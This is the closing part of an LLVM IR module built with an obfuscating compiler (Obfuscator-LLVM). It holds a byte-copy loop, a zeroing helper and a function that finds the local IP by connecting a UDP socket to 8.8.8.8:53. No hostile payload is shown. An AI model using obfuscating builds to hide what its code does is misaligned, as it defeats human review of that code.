  %4 = icmp eq i32 %2, 0
  br i1 %4, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %3
  %5 = add i32 %2, -1
  %xtraiter = and i32 %2, 7
  %lcmp.mod = icmp eq i32 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph.prol.loopexit, label %.lr.ph.prol.preheader

.lr.ph.prol.preheader:                            ; preds = %.lr.ph.preheader
  br label %.lr.ph.prol

.lr.ph.prol:                                      ; preds = %.lr.ph.prol, %.lr.ph.prol.preheader
  %.08.prol = phi i8* [ %7, %.lr.ph.prol ], [ %1, %.lr.ph.prol.preheader ]
  %.047.prol = phi i8* [ %9, %.lr.ph.prol ], [ %0, %.lr.ph.prol.preheader ]
  %.056.prol = phi i32 [ %6, %.lr.ph.prol ], [ %2, %.lr.ph.prol.preheader ]
  %prol.iter = phi i32 [ %prol.iter.sub, %.lr.ph.prol ], [ %xtraiter, %.lr.ph.prol.preheader ]
  %6 = add nsw i32 %.056.prol, -1
  %7 = getelementptr inbounds i8, i8* %.08.prol, i64 1
  %8 = load i8, i8* %.08.prol, align 1
  %9 = getelementptr inbounds i8, i8* %.047.prol, i64 1
  store i8 %8, i8* %.047.prol, align 1
  %prol.iter.sub = add i32 %prol.iter, -1
  %prol.iter.cmp = icmp eq i32 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph.prol.loopexit.unr-lcssa, label %.lr.ph.prol, !llvm.loop !9

.lr.ph.prol.loopexit.unr-lcssa:                   ; preds = %.lr.ph.prol
  br label %.lr.ph.prol.loopexit

.lr.ph.prol.loopexit:                             ; preds = %.lr.ph.preheader, %.lr.ph.prol.loopexit.unr-lcssa
  %.08.unr = phi i8* [ %1, %.lr.ph.preheader ], [ %7, %.lr.ph.prol.loopexit.unr-lcssa ]
  %.047.unr = phi i8* [ %0, %.lr.ph.preheader ], [ %9, %.lr.ph.prol.loopexit.unr-lcssa ]
  %.056.unr = phi i32 [ %2, %.lr.ph.preheader ], [ %6, %.lr.ph.prol.loopexit.unr-lcssa ]
  %10 = icmp ult i32 %5, 7
  br i1 %10, label %._crit_edge.loopexit, label %.lr.ph.preheader.new

.lr.ph.preheader.new:                             ; preds = %.lr.ph.prol.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph, %.lr.ph.preheader.new
  %.08 = phi i8* [ %.08.unr, %.lr.ph.preheader.new ], [ %33, %.lr.ph ]
  %.047 = phi i8* [ %.047.unr, %.lr.ph.preheader.new ], [ %35, %.lr.ph ]
  %.056 = phi i32 [ %.056.unr, %.lr.ph.preheader.new ], [ %32, %.lr.ph ]
  %11 = getelementptr inbounds i8, i8* %.08, i64 1
  %12 = load i8, i8* %.08, align 1
  %13 = getelementptr inbounds i8, i8* %.047, i64 1
  store i8 %12, i8* %.047, align 1
  %14 = getelementptr inbounds i8, i8* %.08, i64 2
  %15 = load i8, i8* %11, align 1
  %16 = getelementptr inbounds i8, i8* %.047, i64 2
  store i8 %15, i8* %13, align 1
  %17 = getelementptr inbounds i8, i8* %.08, i64 3
  %18 = load i8, i8* %14, align 1
  %19 = getelementptr inbounds i8, i8* %.047, i64 3
  store i8 %18, i8* %16, align 1
  %20 = getelementptr inbounds i8, i8* %.08, i64 4
  %21 = load i8, i8* %17, align 1
  %22 = getelementptr inbounds i8, i8* %.047, i64 4
  store i8 %21, i8* %19, align 1
  %23 = getelementptr inbounds i8, i8* %.08, i64 5
  %24 = load i8, i8* %20, align 1
  %25 = getelementptr inbounds i8, i8* %.047, i64 5
  store i8 %24, i8* %22, align 1
  %26 = getelementptr inbounds i8, i8* %.08, i64 6
  %27 = load i8, i8* %23, align 1
  %28 = getelementptr inbounds i8, i8* %.047, i64 6
  store i8 %27, i8* %25, align 1
  %29 = getelementptr inbounds i8, i8* %.08, i64 7
  %30 = load i8, i8* %26, align 1
  %31 = getelementptr inbounds i8, i8* %.047, i64 7
  store i8 %30, i8* %28, align 1
  %32 = add nsw i32 %.056, -8
  %33 = getelementptr inbounds i8, i8* %.08, i64 8
  %34 = load i8, i8* %29, align 1
  %35 = getelementptr inbounds i8, i8* %.047, i64 8
  store i8 %34, i8* %31, align 1
  %36 = icmp eq i32 %32, 0
  br i1 %36, label %._crit_edge.loopexit.unr-lcssa, label %.lr.ph

._crit_edge.loopexit.unr-lcssa:                   ; preds = %.lr.ph
  br label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph.prol.loopexit, %._crit_edge.loopexit.unr-lcssa
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @util_zero(i8* nocapture, i32) local_unnamed_addr #0 {
  %3 = icmp eq i32 %1, 0
  br i1 %3, label %._crit_edge, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %2
  %4 = add i32 %1, -1
  %5 = zext i32 %4 to i64
  %6 = add nuw nsw i64 %5, 1
  call void @llvm.memset.p0i8.i64(i8* %0, i8 0, i64 %6, i32 1, i1 false)
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_local_addr() local_unnamed_addr #1 {
  %1 = alloca %struct.sockaddr_in, align 4
  %2 = alloca i32, align 4
  store i32 16, i32* %2, align 4
  %3 = tail call i32* @__errno_location() #12
  store i32 0, i32* %3, align 4
  %4 = tail call i32 @socket(i32 2, i32 2, i32 0) #8
  %5 = icmp eq i32 %4, -1
  br i1 %5, label %17, label %6

; <label>:6:                                      ; preds = %0
  %7 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 0
  store i16 2, i16* %7, align 4
  %8 = tail call i32 @htonl(i32 134744072) #12
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 2, i32 0
  store i32 %8, i32* %9, align 4
  %10 = tail call zeroext i16 @htons(i16 zeroext 53) #12
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 1
  store i16 %10, i16* %11, align 2
  %12 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  %13 = call i32 @connect(i32 %4, %struct.sockaddr* nonnull %12, i32 16) #8
  %14 = call i32 @getsockname(i32 %4, %struct.sockaddr* nonnull %12, i32* nonnull %2) #8
  %15 = call i32 @close(i32 %4) #8
  %16 = load i32, i32* %9, align 4
  br label %17

; <label>:17:                                     ; preds = %0, %6
  %.0 = phi i32 [ %16, %6 ], [ 0, %0 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #12

attributes #0 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind }
attributes #9 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #11 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #12 = { nounwind readnone }
attributes #13 = { nounwind readonly }
attributes #14 = { noreturn nounwind }
attributes #15 = { cold }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = distinct !{!1, !2}
!2 = !{!"llvm.loop.unroll.disable"}
!3 = !{i32 -2146836174}
!4 = !{i32 -2146835765}
!5 = distinct !{!5, !2}
!6 = !{i32 -2146836302}
!7 = !{i32 -2146835893}
!8 = distinct !{!8, !2}
!9 = distinct !{!9, !2}